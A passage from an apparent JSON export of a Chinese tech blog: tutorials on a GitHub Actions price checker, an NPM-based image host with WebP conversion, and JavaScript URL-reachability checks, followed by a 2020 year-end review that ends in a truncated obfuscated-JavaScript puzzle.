<span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 4分8秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量...</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( 